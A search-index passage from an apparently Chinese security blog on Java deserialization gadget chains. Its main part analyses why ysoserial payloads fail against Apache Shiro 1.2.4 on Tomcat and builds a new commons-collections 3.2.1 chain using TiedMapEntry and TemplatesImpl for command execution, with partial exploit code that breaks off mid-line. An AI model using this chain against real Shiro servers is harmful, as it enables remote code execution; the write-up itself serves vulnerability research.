\u6839\u636e \u4e00\u5b9a \u7684 \u89c4\u5219 \u6765 \u8fdb\u884c \u4e00\u4e2a \u94fe\u6761 \u7684 \u8fde\u63a5 \u3002   \u90a3\u4e48 \u6765\u770b \u4e00\u4e0b \uff0c \u53ef \u5229\u7528 \u7684 \u8282\u70b9 \u662f \u4ec0\u4e48 \uff1f   \u5b9e\u73b0 \u4e86   Serializable   \u63a5\u53e3 \uff0c \u679a\u4e3e \u51fa \u6240\u6709 \u53ef\u4ee5 \u88ab \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u7c7b \u3002   \u8be5\u7c7b \u7684 \u7c7b \u5c5e\u6027 \u505a \u4e86 \u51fd\u6570 \u8c03\u7528 \u51fd\u6570\u8c03\u7528 \u6216 \u51fd\u6570 \u7684 \u8fd4\u56de \u8fd4\u56de\u503c \uff0c \u5982   TreeMap . map . put ( )   \u548c   ConstantTransformer . transform   \u76f4\u63a5 \u8fd4\u56de   iConstant   \u7c7b \u5c5e\u6027 \u3002 \u5982\u679c \u4e0d \u5b58\u5728 \u4e0a\u8ff0 \u7684 \u60c5\u51b5 \uff0c \u6211\u4eec \u53ef\u4ee5 \u5ffd\u7565 \u3002   \u5b9e\u73b0 \u4e86   readObject   \u51fd\u6570 \uff0c \u8fd9\u79cd \u60c5\u51b5 \u53ef \u4f5c\u4e3a \u8d77\u59cb \u70b9 \uff0c \u4e5f \u53ef\u4ee5 \u4f5c\u4e3a \u6865 \u63a5\u70b9 \uff0c \u9700\u8981 \u5177\u4f53 \u5224\u65ad \u5176 \u4ee3\u7801 \u7684 \u5b9e\u73b0 \u3002   \u5b9e\u73b0 \u4e86   invoke   \u51fd\u6570 \uff0c \u8fd9\u79cd \u60c5\u51b5 \u53ef \u4f5c\u4e3a \u6865 \u63a5\u70b9 \uff0c \u5229\u7528 \u4e86 \u4ee3\u7406 \u673a\u5236 \u3002   \u4ece   readObject   \u51fd\u6570 \u548c   invoke   \u51fd\u6570 \uff0c \u884d\u751f \u51fa\u6765 \u7684 \u7c7b \u5c5e\u6027 \u51fd\u6570 \u8c03\u7528 \u51fd\u6570\u8c03\u7528 \uff0c \u8fd9\u8fb9 \u53ef\u80fd \u4f1a \u5f15\u5411 \u5176\u4ed6 \u7684 \u7c7b \u51fd\u6570 \uff0c \u5982   TreeBag . readObject   \u7684 \u5b9e\u73b0 \uff0c \u5c06 \u5f15\u5411 \u4e0b \u4e00\u6b65 \u7684 \u7236\u7c7b \u51fd\u6570   doReadObject   \u51fd\u6570 \u3002 \u8fd9\u91cc \u5c31 \u9700\u8981 \u505a \u4e00\u4e2a \u4eba\u5de5 \u6216\u8005 \u662f \u9759\u6001 \u7684 \u4ee3\u7801 \u5206\u6790 \u3002   \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \uff0c \u5173\u4e8e \u53ef \u5229\u7528 \u8282\u70b9 \u7684 \u4e32\u8054 \uff0c \u5176\u5b9e \u4e3b\u8981 \u4f9d\u8d56 \u8d56\u4e8e \u4f9d\u8d56\u4e8e \u7b2c 5 \u70b9 \u7684 \u6316\u6398 \uff0c \u6211\u4eec \u9700\u8981 \u6839\u636e \u7ecf\u9a8c \u6216\u8005 \u662f \u9759\u6001 \u7684 \u4ee3\u7801 \u5206\u6790 \u6765 \u505a \u3002   \u6839\u636e \u4e0a\u9762 \u7684 \u4e00\u4e2a \u5206\u6790 \uff0c \u5176\u5b9e \u6211\u4eec \u53ef\u4ee5 \u505a\u5230 \u4e00\u4e2a \u81ea\u52a8 \u81ea\u52a8\u5316 \u7684 \u5229\u7528 \u94fe \u53d1\u6398 \uff0c https : / / github . com / JackOfMostTrades / gadgetinspector   \u8fd9\u4e2a \u5de5\u5177 \u5c31\u662f \u4e00\u4e2a \u5f88 \u597d \u7684 \u5b9e\u73b0 \uff0c \u540e\u7eed \u5c06 \u5bf9 \u5176 \u8fdb\u884c \u4e00\u4e2a \u5206\u6790 \u3002   \u4ece commons - collections \u7684 \u9632\u62a4 \u6765\u770b \uff0c \u6211\u4eec \u8d8a\u6765 \u8d8a\u6765\u8d8a \u65e0\u6cd5 \u5728 \u5355\u4e2a \u5e93 \u91cc\u9762 \u5b9e\u73b0 \u4e00\u4e2a \u53ef \u5229\u7528 \u7684 \u5229\u7528 \u94fe \uff0c \u8fd9 \u4e5f \u610f\u5473 \u610f\u5473\u7740 \u6211\u4eec \u9700\u8981 \u5bf9 \u4e0d\u540c \u7684 \u9879\u76ee \u505a \u9488\u5bf9 \u9488\u5bf9\u6027 \u7684 \u5206\u6790 \uff0c \u6240\u4ee5 gadetinspector \u8fd9\u4e2a \u5de5\u5177 \u7684 \u91cd\u8981 \u91cd\u8981\u6027 \u5c31 \u4e0d\u8a00 \u4e0d\u8a00\u800c\u55bb \u4e86 \u3002 \u4e0b \u4e00\u6b65 \u5c06 \u91cd\u70b9 \u5206\u6790 \u4e00\u4e0b \u8be5 \u5de5\u5177 \u7684 \u5b9e\u73b0 \u3002","title":"2 .   \u5229\u7528 \u94fe \u603b\u4f53 \u7684 \u4e00\u4e2a \u6316\u6398 \u601d\u8def"},{"location":"blog/2019/study-java-deserialized-shiro-1-2-4-20191110/","tags":["java"],"text":"0x00   \u524d\u8a00   \u5728 \u8ddf \u4e86 \u4e00\u904d commons - collections \u7cfb\u5217 \u7684 payload \u540e \uff0c \u7ec8\u4e8e \u53ef\u4ee5 \u5f00\u59cb \u89e3\u51b3 \u4e00\u4e0b \u5f53\u65f6 \u5bf9 shiro \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6a21\u51cc \u4e24 \u53ef \u7684 \u8ba4\u8bc6 \u4e86 \u3002   \u5f53\u524d \uff0c \u4e0d\u7ba1 \u662f \u56fd\u5185 \u5b9e\u9645 \u7684 xx \u884c\u52a8 \u8fd8\u662f ctf \u6bd4\u8d5b \uff0c shiro \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u4f1a \u7ecf\u5e38 \u770b\u5230 \u3002 \u4f46 \u5728 \u5b9e\u9645 \u5229\u7528 \u8fd9\u4e2a \u6f0f\u6d1e \u7684 \u65f6\u5019 \uff0c \u4f1a \u53d1\u73b0 \u6211\u4eec \u65e0\u6cd5 \u5728 tomcat \u4e0b \u76f4\u63a5 \u5229\u7528 shiro - sample \u4e2d \u7684   commons - collections : 3.2 . 1   \uff08 2021 - 03 - 16 \u66f4\u65b0 \uff0c \u8fd9\u91cc \u7ecf p \u725b \u6307\u6b63 \uff0c shiro \u5e76 \u6ca1\u6709 \u4f9d\u8d56 cc \u5e93 \uff0c   \u8be6\u60c5   \uff09 \u3002   \u6211\u4eec \u524d\u9762 \u5df2\u7ecf \u5bf9 commons - collections \u7cfb\u5217 \u5229\u7528 \u94fe \u7684 \u5206\u6790 \uff0c \u4eca\u5929 \u5c31 \u6765 \u6839\u636e \u5b66\u5230 \u7684 \u77e5\u8bc6 \u6765 \u89e3\u51b3 \u8fd9\u4e2a \u95ee\u9898 \u3002   \u672c\u6587 \u8ba8\u8bba \u4e86 shiro - 1.2 . 4 \u7248\u672c \u65e0\u6cd5 \u76f4\u63a5 \u5229\u7528 \u73b0\u6709 \u7684 ysoserial \u5229\u7528 \u94fe \uff0c \u5e76 \u63d0\u51fa \u4e86 \u76f8\u5e94 \u7684 \u89e3\u51b3 \u65b9\u6848 \u89e3\u51b3\u65b9\u6848 \u3002   0x01   \u73af\u5883 \u51c6\u5907   \u8fd9\u91cc \u7528 \u7684 \u662f   shiro - root - 1.2 . 4   \u7684 samples / web \u73af\u5883 \uff0c clone \u4e0b\u6765 \u540e \u6267\u884c   git   checkout   shiro - root - 1.2 . 4   \u5229\u7528 \u811a\u672c \u53c2\u8003 \u7684   \u77e5\u9053 \u521b\u5b87 \u7684 \u4e00\u7bc7 \u5206\u6790   ysoserial \u7528 \u7684 0.0 . 6 \u7248\u672c   https : / / github . com / frohoff / ysoserial   \u5148 \u6765\u8bb2 \u4e00\u4e0b \uff0c \u5173\u4e8e \u73af\u5883 \u65b9\u9762 \u9047\u5230 \u7684 \u5751 \uff1a   \u5728 \u90e8\u7f72 \u8fc7\u7a0b \u4e2d \uff0c \u9047\u5230 \u4e86   The   absolute   uri :   http : / / java . sun . com / jsp / jstl / core   cannot   be   resolved   in   either   web . xml   or   the   jar   files   deployed   with   this   application   \u7684 \u9519\u8bef   \u8fd9\u91cc \u7684 \u89e3\u51b3 \u65b9\u6848 \u89e3\u51b3\u65b9\u6848 \u662f \u4fee\u6539 pom . xml   \u200b   \u6dfb\u52a0 jstl \u7684 \u5177\u4f53 \u7248\u672c \u5373\u53ef \u89e3\u51b3 \u3002   serialVersionUID \u4e0d \u4e00\u81f4 \u5bfc\u81f4 \u65e0\u6cd5 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u95ee\u9898   \u8fd9\u91cc \u53ef\u80fd \u5728 \u4f60 \u7684 \u5b9e\u9a8c \u73af\u5883 \u4e0b \u4e0d \u4e00\u5b9a \u4f1a \u9047\u5230 \uff0c \u6211 \u7684 \u5b9e\u9a8c \u73af\u5883 \u548c ysoserial \u751f\u6210 \u7684 \u67d0 \u51e0\u4e2a \u7c7b \u7684 serialVersionUID \u4e0d \u4e00\u81f4 \uff0c \u5bfc\u81f4 \u65e0\u6cd5 \u6b63\u5e38 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u3002 \u5728 \u5b9e\u6218 \u4e2d \u4f60 \u53ef\u4ee5 \u91c7\u7528   \u8fd9 \u6587\u7ae0 \u7bc7\u6587\u7ae0   \u5904\u7406 \u65b9\u6cd5 \uff0c \u8fd9\u91cc \u6211 \u7684 \u89e3\u51b3 \u65b9\u6848 \u89e3\u51b3\u65b9\u6848 \u662f \u76f4\u63a5 \u540c\u6b65 \u4e2a   commons - collections : 3.2 . 1   \u7248\u672c \uff0c \u5728 \u751f\u6210 war \u5305\u524d \uff0c \u5728 pom . xml \u52a0\u5165   < dependency >   < groupId >   commons - collections   < / groupId >   < artifactId >   commons - collections   < / artifactId >   < version >   3.2 . 1   < / version >   < scope >   runtime   < / scope >   < / dependency >   0x02   \u524d\u666f \u56de\u987e   16 \u5e74 \u7684 \u65f6\u5019 \uff0c shiro \u7206\u51fa \u4e86 \u4e00\u4e2a \u9ed8\u8ba4 key \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e \u3002 \u81f3\u4eca \u5df2\u6709 \u81f3\u4eca\u5df2\u6709 \u5927\u91cf \u7684 \u5206\u6790 \u6587\u7ae0 \u5206\u6790 \u4e86 \u8be5 \u6f0f\u6d1e \u7684 \u539f\u7406 \uff0c \u6240\u4ee5 \u672c\u6587 \u4e0d\u518d \u91cd\u590d \u5206\u6790 \u8be5 \u6f0f\u6d1e \u7684 \u76f8\u5173 \u539f\u7406 \uff0c \u53ef\u4ee5 \u53c2\u8003 \u4ee5\u4e0b \u51e0\u7bc7 \u6587\u7ae0 \u7684 \u5206\u6790 \uff1a   1 . https : / / blog . knownsec . com / 2016 / 08 / apache - shiro - java /   2 . https : / / blog . zsxsoft . com / post / 35   3 . http : / / blog . orange . tw / 2018 / 03 / pwn - ctf - platform - with - java - jrmp - gadget . html   \u9664\u4e86 1 \u4e2d \u5728 \u6f0f\u6d1e \u73af\u5883 \u4e0b \u6dfb\u52a0 \u4e86   commons - collections : 4.0   \uff0c \u53e6\u5916 \u4e24\u7bc7 \u6587\u7ae0 \u5747 \u63d0\u5230 \u4e86 \u5728 tomcat \u4e0b \u65e0\u6cd5 \u76f4\u63a5 \u5229\u7528   commons - collections : 3.2 . 1   \u7684 \u95ee\u9898 \u3002 \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u6211\u4eec \u5c31 \u6765 \u770b\u770b \u662f \u4ec0\u4e48 \u539f\u56e0 \u5427 \uff1a \uff09   org . apache . shiro . io . DefaultSerializer . deserialize : 67   \u8fd9\u91cc \u6211\u4eec \u76f4\u63a5 \u770b\u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u53d1\u751f \u7684 \u70b9 \uff0c \u7b2c 75 \u884c \u4f7f\u7528 \u4e86   ClassResolvingObjectInputStream   \u7c7b \u800c \u4f20\u7edf \u975e\u4f20\u7edf \u7684   ObjectInputStream   . \u8fd9\u91cc \u53ef\u80fd \u662f \u5f00\u53d1 \u53d1\u4eba \u4eba\u5458 \u5f00\u53d1\u4eba\u5458 \u505a \u7684 \u4e00\u79cd \u9632\u62a4 \u63aa\u65bd \uff1f \u4ed6 \u91cd\u5199 \u4e86   ObjectInputStream   \u7c7b \u7684   resolveClass   \u51fd\u6570 \uff0c \u6211 \u66fe \u5728 \u7b2c\u4e00 \u4e00\u7bc7 \u7b2c\u4e00\u7bc7   \u57fa\u7840 \u6587\u7ae0   \u4e2d \u5206\u6790 \u8fc7 Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u8fc7\u7a0b \uff0c   ObjectInputStream   \u7684   resolveClass   \u51fd\u6570 \u7528 \u7684 \u662f   Class . forName   \u7c7b \u83b7\u53d6 \u5f53\u524d \u63cf\u8ff0 \u5668 \u6240\u6307 \u4ee3 \u7684 \u7c7b \u7684 Class \u5bf9\u8c61 \u3002 \u800c \u91cd\u5199 \u540e \u7684   resolveClass   \u51fd\u6570   \u91c7\u7528 \u7684 \u662f   ClassUtils . forName   \uff0c \u6211\u4eec \u7ee7\u7eed \u770b \u8fd9\u4e2a forName \u7684 \u5b9e\u73b0 \u3002   \u6765 \u770b\u770b \u8fd9\u4e2a   ExceptionIgnoringAccessor   \u662f \u600e\u4e48 \u5b9e\u73b0 \u7684   \u8fd9\u91cc \u5b9e\u9645 \u5b9e\u9645\u4e0a \u8c03\u7528 \u4e86   ParallelWebAppClassLoader   \u7236\u7c7b   WebappClassLoaderBase   \u7684   loadClass   \u51fd\u6570 \uff08 \u53ef\u4ee5 \u76f4\u63a5 \u4e0b \u65ad\u70b9 \u770b\u770b \u5185\u5bb9 \uff09 \u3002   \u8be5 loadClass \u8f7d\u5165 \u6309\u7167 \u4e0a\u8ff0 \u7684 \u987a\u5e8f \uff08 \u8fd9\u91cc \u4e0d\u8d34 \u4ee3\u7801 \u4e86 \uff0c \u627e\u5230   org . apache . catalina . loader . WebappClassLoaderBase . loadClass   \u5373\u53ef \uff09 \uff0c \u5148 \u4ece cache \u4e2d \u627e \u5df2 \u8f7d\u5165 \u7684 \u7c7b \uff0c \u5982\u679c \u524d 3 \u70b9 \u90fd \u6ca1 \u627e\u5230 \uff0c \u518d \u901a\u8fc7 \u7236\u7c7b   URLClassLoader   \u7684   loadClass   \u51fd\u6570 \u8f7d\u5165 \u3002 \u4f46\u662f \u5b9e\u9645 \u5b9e\u9645\u4e0a \u6b64\u65f6 loadClass \u7684 \u53c2\u6570 name \u503c \u5e26\u4e0a \u4e86 \u6570\u7ec4 \u7684 \u6807\u5fd7 \uff0c \u5373   / Lorg / apache / commons / collections / Transformer ; . class   \uff0c \u5728 \u53c2\u8003 \u7684 \u7b2c\u4e8c \u4e8c\u7bc7 \u7b2c\u4e8c\u7bc7 \u6587\u7ae0 \u91cc \u6709 \u63d0\u5230 \u8fd9\u4e2a \u95ee\u9898 \uff0c \u6240\u4ee5 \u5bfc\u81f4 shiro \u65e0\u6cd5 \u8f7d\u5165 \u6570\u7ec4 \u7c7b\u578b \u7684 \u5bf9\u8c61 \u3002   \u90a3\u4e48 \u5982\u4f55 \u624d\u80fd \u771f\u6b63 \u7684 \u5229\u7528   commons - collections : 3.2 . 1   \u6765 \u6784\u9020 \u5229\u7528 \u94fe \u5462 \uff1f   \u9996\u5148 \uff0c \u5728 \u53c2\u8003 \u7684 \u7b2c\u4e00 \u4e00\u7bc7 \u7b2c\u4e00\u7bc7 \u6587\u7ae0 \u91cc \uff0c \u4f5c\u8005 \u5728 \u73af\u5883 \u4e2d \u5f15\u5165 \u4e86   commons - collections : 4.0   \uff0c \u4f7f\u5f97 ysoserial \u7684   CommonsCollections2   \u5229\u7528 \u94fe \u53ef\u4ee5 \u6210\u529f \u5229\u7528 \u3002 \u8fd9 \u56e0\u4e3a \u662f\u56e0\u4e3a   CommonsCollections2   \u7528 \u7684 \u662f\u975e \u6570\u7ec4 \u5f62\u5f0f \u7684 \u5229\u7528 \u94fe \uff0c \u5728 \u8be5 \u5229\u7528 \u94fe\u4e0a \u6ca1\u6709 \u51fa\u73b0 \u6570\u7ec4 \u7c7b\u578b \u7684 \u5bf9\u8c61 \uff0c \u8fd9 \u4f7f\u5f97 \u5728 shiro \u7684 \u73af\u5883 \u4e0b \uff0c \u53ef\u4ee5 \u6b63\u786e \u6267\u884c \u547d\u4ee4 \u6267\u884c\u547d\u4ee4 \u3002   \u90a3\u4e48 \uff0c \u95ee\u9898 \u6765 \u4e86 \uff0c \u6211\u4eec \u662f\u5426 \u80fd \u6784\u9020 \u51fa \u4e00\u4e2a \u5728   commons - collections : 3.2 . 1   \u4e0b \u53ef\u4ee5 \u5229\u7528 \uff0c \u5e76\u4e14 \u5728 \u5229\u7528 \u94fe\u4e0a \u4e0d \u5b58\u5728 \u6570\u7ec4 \u7c7b\u578b \u7684 \u5bf9\u8c61 \uff1f \u7b54\u6848 \u5f53\u7136 \u662f \u80af\u5b9a \u7684 \uff1a \uff09   0x03   \u65b0 \u5229\u7528 \u94fe \u6784\u9020   \u6839\u636e 0x02 \u7684 \u4ecb\u7ecd \uff0c \u6211\u4eec \u53ef\u4ee5 \u6e05\u695a \u7684 \u662f \u5229\u7528 \u94fe\u4e2d \u7684   ChainedTransformer   \u8fd9\u4e2a \u7c7b \u7684 \u5229\u7528 \u662f \u65e0\u6cd5 \u6210\u529f \u7684 \uff0c \u56e0\u4e3a \u4ed6 \u7684 \u7c7b \u5c5e\u6027   iTransformers   \u662f \u6570\u7ec4 \u7c7b\u578b \u7684   Transformers   \uff0c \u4e5f \u5c31\u662f \u5728 \u6267\u884c \u8fc7\u7a0b \u4e2d \u53d1\u751f \u7684   ClassNotFoundException   \u3002   \u5982\u679c \u4f60 \u770b\u8fc7 \u524d \u51e0\u7bc7 \u5173\u4e8e commons - collections \u7cfb\u5217 \u7684 payload \u5206\u6790 \uff0c \u90a3\u4e48 \u4f60 \u80af\u5b9a \u53ef\u4ee5 \u56de\u5fc6 \u8d77\u6765 \uff0c \u9664\u4e86 \u5229\u7528   ChainedTransformer   \u8fd9\u79cd \u65b9\u5f0f \uff0c \u8fd8 \u53ef\u4ee5 \u4f7f\u7528   TemplatesImpl . newTransformer   \u51fd\u6570 \u6765 \u52a8\u6001   loadClass   \u6784\u9020 \u597d \u7684 evil   class   bytes \uff08 \u8fd9 \u4e00\u90e8 \u90e8\u5206 \u4e00\u90e8\u5206 \u4e0d \u590d\u8ff0 \u4e86 \uff0c \u53ef\u4ee5 \u770b \u524d\u9762 \u7684 \u6587\u7ae0 \uff09 \u3002 \u5e76\u4e14 \u5728 \u8fd9\u90e8 \u90e8\u5206 \u8fd9\u90e8\u5206 \u5229\u7528 \u94fe\u4e0a \u662f \u4e0d \u5b58\u5728 \u6570\u7ec4 \u7c7b\u578b \u7684 \u5bf9\u8c61 \u7684 \u3002   \u90a3\u4e48 \uff0c \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u7684 \u91cd\u70b9 \u5c31\u662f \u627e \u4e00\u4e2a \u5982\u4f55 \u89e6\u53d1   TemplatesImpl . newTransformer   \u7684 \u65b9\u6cd5 \u4e86 \uff1a \uff09   \u6211\u4eec \u5148 \u6765 \u56de\u987e \u4e00\u4e0b   CommonsCollections2   \u7684 \u5229\u7528 \u94fe   PriorityQueue . readObject   - >   PriorityQueue . heapify ( )   - >   PriorityQueue . siftDown ( )   - >   PriorityQueue . siftDownUsingComparator ( )   - >   TransformingComparator . compare ( )   - >   InvokerTransformer . transform ( )   - >   TemplatesImpl . newTransformer ( )   ...   templates   Gadgets   ...   - >   Runtime . getRuntime ( ) . exec ( )   \u5728 \u8fd9 \u6761\u94fe \u4e0a \uff0c \u7531\u4e8e TransformingComparator \u5728 3.2 . 1 \u7684 \u7248\u672c \u4e0a \u8fd8 \u6ca1\u6709 \u5b9e\u73b0 Serializable \u63a5\u53e3 \uff0c \u5176 \u5728 3.2 . 1 \u7248\u672c \u4e0b \u662f \u65e0\u6cd5 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u3002 \u6240\u4ee5 \u6211\u4eec \u65e0\u6cd5 \u76f4\u63a5 \u5229\u7528 \u8be5 payload \u6765 \u8fbe\u5230 \u547d\u4ee4 \u6267\u884c \u7684 \u76ee\u7684 \u3002   \u90a3\u4e48 \u5c31 \u6765 \u6539\u9020 \u6539\u9020 \u5427 \uff01 \u6211\u4eec \u5148 \u5c06 \u6ce8\u610f \u6ce8\u610f\u529b \u5173\u6ce8 \u5728   InvokerTransformer . transform ( )   \u4e0a   \u8fd9\u91cc \u662f \u6700 \u7ecf\u5178 \u7684 \u53cd\u5c04 \u673a\u5236 \u7684 \u5199\u6cd5 \uff0c \u6839\u636e \u4f20\u5165 \u7684   input   \u5bf9\u8c61 \uff0c \u8c03\u7528 \u5176   iMethodName   \uff08 \u53ef\u63a7 \uff09 \u3002 \u90a3\u4e48 \u5982\u679c \u6b64\u65f6 \u4f20\u5165 \u7684   input   \u4e3a \u6784\u9020 \u597d \u7684   TemplatesImpl   \u5bf9\u8c61 \u5462 \uff1f   \u5f88 \u660e\u663e \uff0c \u8fd9\u6837 \u6211\u4eec \u5c31 \u53ef\u4ee5 \u901a\u8fc7 \u5c06   iMethodName   \u7f6e \u4e3a   newTransformer   \uff0c \u4ece\u800c \u5b8c\u6210 \u540e\u7eed \u7684 templates   gadgets \u3002   \u90a3\u4e48 \u95ee\u9898 \u6765 \u4e86 \uff0c \u600e\u4e48 \u5c06 \u4f20\u5165 \u7684   input   \u7f6e \u4e3a   TemplatesImpl   \u5bf9\u8c61 \u5462 \uff1f   \u5728 ysoserial \u7684 \u5229\u7528 \u94fe\u4e2d \uff0c \u5173\u4e8e   transform   \u51fd\u6570 \u63a5\u6536 \u7684   input   \u5b58\u5728 \u4e24\u79cd \u60c5\u51b5 \u3002   1 . \u914d\u5408   ChainedTransformer   InvokerTransformer   \u5f80\u5f80 \u540c   ChainedTransformer   \u914d\u5408 \uff0c \u5faa\u73af \u6784\u9020 Runtimt . getRuntime ( ) . exec \u3002 \u5f88 \u660e\u663e \uff0c \u8fd9\u91cc \u6211\u4eec \u65e0\u6cd5 \u5229\u7528 \u4e86 \u3002   2 . \u65e0 \u610f\u4e49 \u7684   String   \u8fd9\u91cc \u7684 \u65e0 \u610f\u4e49 \u7684   String   \u6307 \u7684 \u662f \u4f20\u5165 \u5230   ConstantTransformer . transform   \u51fd\u6570 \u7684   input   \uff0c \u8be5   transform   \u51fd\u6570 \u4e0d \u4f9d\u8d56   input   \uff0c \u800c \u76f4\u63a5 \u8fd4\u56de   iConstant   \u8fd9\u91cc \u7b2c\u4e00 \u4e00\u6761 \u7b2c\u4e00\u6761 \u8def \u80af\u5b9a \u65ad \u4e86 \uff0c \u90a3\u4e48 \u5c31\u662f \u600e\u4e48 \u5229\u7528 \u8fd9\u4e2a \u65e0 \u610f\u4e49 \u7684   String   \u4e86 \uff01   \u4ece   CommonsCollection5   \u5f00\u59cb \uff0c \u51fa\u73b0 \u4e86   TiedMapEntry   \uff0c \u5176 \u4f5c\u4e3a \u4e2d\u7ee7 \uff0c \u8c03\u7528 \u4e86   LazyMap   \uff08 map \uff09 \u7684   get   \u51fd\u6570 \u3002   \u6765\u770b \u4e00\u770b   \u5176\u4e2d   map   \u548c   key   \u6211\u4eec \u90fd \u53ef\u4ee5 \u63a7\u5236 \uff0c \u800c   LazyMap . get   \u8c03\u7528 \u4e86   transform   \u51fd\u6570 \uff0c \u5e76 \u5c06 \u53ef\u63a7 \u7684   key   \u4f20\u5165   transform   \u51fd\u6570   \u8fd9\u91cc \u5c31 \u63a5\u4e0a \u4e86 \u6211\u4eec \u524d\u9762 \u8ba8\u8bba \u7684 \uff0c \u5c06 \u6784\u9020 \u597d \u7684   TemplatesImpl   \uff08 key \uff09 \u4f5c\u4e3a   InvokerTransformer . transform   \u51fd\u6570 \u7684   input   \u4f20\u5165 \uff0c \u6211\u4eec \u5c31 \u53ef\u4ee5 \u5c06 templates   gadgets \u4e32 \u8d77\u6765 \u4e86 \u3002   \u7b80\u5355 \u6765\u8bf4 \uff0c \u6211\u4eec \u5c06   CommonsCollections5 , 6 , 9   \u6784\u9020 \u94fe\u4e2d \u7684   TiedMapEntry   \u7684 key \u7528 \u4e86 \u8d77\u6765 \u3002   final   Object   templates   =   Gadgets   .   createTemplatesImpl   (   command   ) ;   / /   TiedMapEntry   entry   =   new   TiedMapEntry ( lazyMap ,   \" foo \" ) ;   / / \u539f\u6765 \u7684 \u5229\u7528 \u65b9\u5f0f   TiedMapEntry   entry   =   new   TiedMapEntry   (   lazyMap   ,   templates   ) ;   \u8fd9\u91cc \u5c06 \u65e0 \u610f\u4e49 \u7684   foo   \u6539\u9020 \u6210 \u4e86 \u89e6\u53d1   TemplatesImpl . newTransformer   \u7684 trigger \u3002   \u800c \u5728   TiedMapEntry   \u524d \u7684 \u5229\u7528 \u94fe \uff0c \u5728 \u539f\u751f shiro \u73af\u5883 \u4e0b \uff0c \u5e76 \u4e0d \u51b2\u7a81 \uff08 \u6ca1\u6709 \u6570\u7ec4 \u7c7b\u578b \u7684 \u5bf9\u8c61 \uff09 \uff0c \u53ef\u4ee5 \u6b63\u5e38 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u3002 \u8fd9 \u4e00\u90e8 \u90e8\u5206 \u4e00\u90e8\u5206 \u5c31 \u7701\u7565 \u4e86 \u3002   20200108 \u8865\u5145   \u5176\u5b9e createTemplatesImpl \u7684 \u5229\u7528 \u65b9\u5f0f \u4e2d \u8fd8\u662f \u5b58\u5728 \u6570\u7ec4 \u5f62\u5f0f \u7684 \uff0c byte [ ] \u6570\u7ec4 \u7528\u4e8e \u5b58\u50a8 evil   class \u3002 \u4f46\u662f \u5728 tomcat   7 \u53ca \u4ee5\u4e0a \u7684 \u73af\u5883 \u4e0b \uff0c java \u7684 \u539f\u751f \u6570\u636e \u7c7b\u578b \u6570\u636e\u7c7b\u578b \u7684 \u6570\u7ec4 \u8fd8\u539f \u4e0d \u5f71\u54cd \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \uff0c \u53ea \u9488\u5bf9 \u5bf9\u8c61 \u7ea7\u522b \u7684 \u6570\u7ec4 \u8fd8\u539f \u3002 \u800c tomcat6 \u7684 \u5b9e\u73b0 \u65b9\u5f0f \u76f4\u63a5 \u4e0d \u5141\u8bb8 \u6570\u7ec4 \u7c7b\u578b \u7684 \u8fd8\u539f \uff0c \u5c31\u662f \u5c31\u662f\u8bf4 \u4e5f\u5c31\u662f\u8bf4 \u8be5 \u5229\u7528 \u94fe \u5728 tomcat6 \u7684 \u73af\u5883 \u4e0b \u662f \u6210\u529f \u4e0d\u4e86 \u7684 \u3002   20200109 \u8865\u5145   \u5f53 \u5e94\u7528 \u5f00\u542f \u4e86 security   manager \u65f6 \uff0c \u9700\u8981 \u8bbe\u7f6e   - Djdk . xml . enableTemplatesImplDeserialization = true   0x04   EXP \u7f16\u5199   \u8fd9\u91cc \u5176\u5b9e \u53ef\u4ee5 \u6784\u9020 \u51fa \u597d\u51e0 \u51e0\u4e2a \u597d\u51e0\u4e2a \u94fe \uff0c \u6211 \u8fd9\u91cc \u5c31 \u62ff   HashSet   \u4e3a\u4f8b \uff0c \u5b8c\u6574 \u7684 exp \u89c1   MyYsoserial   \u4e2d \u7684   CommonsCollections10   final   Object   templates   =   Gadgets   .   createTemplatesImpl   (   command   ) ;   / /   \u6784\u9020 \u5e26\u6709 evil   class   bytes \u7684 TemplatesImpl   / /   \u6784\u9020 InvokerTransformer \uff0c \u586b\u5145 \u65e0\u5bb3 \u7684 toString \u51fd\u6570   final   InvokerTransformer   transformer   =   new   InvokerTransformer   (   \" toString \"   ,   new   Class   [   0   ]   ,   new   Object   [   0   ]   ) ;   final   Map   innerMap   =   new   HashMap   ( ) ;   / /   \u6784\u9020 LazyMap \u7684 factory \u4e3a \u524d\u9762 \u7684 InvokerTransformer   final   Map   lazyMap   =   LazyMap   .   decorate   (   innerMap   ,   transformer   ) ;   / /   \u586b\u5145 TiedMapEntry \u7684 map \uff08 lazyMap \uff09 \u548c key \uff08 TemplatesImpl \uff09   TiedMapEntry   entry   =   new   TiedMapEntry   (   lazyMap   ,   templates   ) ;   HashSet   map   =   new   HashSet   (   1   ) ;   map   .   add   (   \" foo \"   ) ;   / /   \u4e0b\u8ff0 \u4ee3\u7801 \u5c06 entry \u586b\u5145 \u5230 HashSet \u7684 node \u7684 key \u4e0a \uff0c \u53ef\u4ee5 \u4f7f\u5f97 HashSet \u5728 put \u7684 \u65f6\u5019 \u8c03\u7528 TiedMapEntry \u7684 hashCode \u51fd\u6570   Field   f   =   null   ;   try   {   f   =   HashSet   .   class   .   getDeclaredField   (   \" map \"   ) ;   }   catch   (   NoSuchFieldException   e   )   {   f   =   HashSet   .   class   .   getDeclaredField   (   \" backingMap \"   ) ;   }   Reflections   .   setAccessible   (   f   ) ;   HashMap   innimpl   =   null   ;   innimpl   =   (   HashMap   )   f   .   get   (   map   ) ;   Field   f2   =   null   ;   try   {   f2   =   HashMap   .   class   .   getDeclaredField   (   \" table \"   ) ;   }   catch   (   NoSuchFieldException   e   )   {   f2   =   HashMap   .   class   .   getDeclaredField   (   \" elementData \"   ) ;   }   Reflections   .   setAccessible   (   f2   ) ;   Object   [ ]   array   =   new   Object   [   0   ]   ;   array   =   (   Object   [ ] 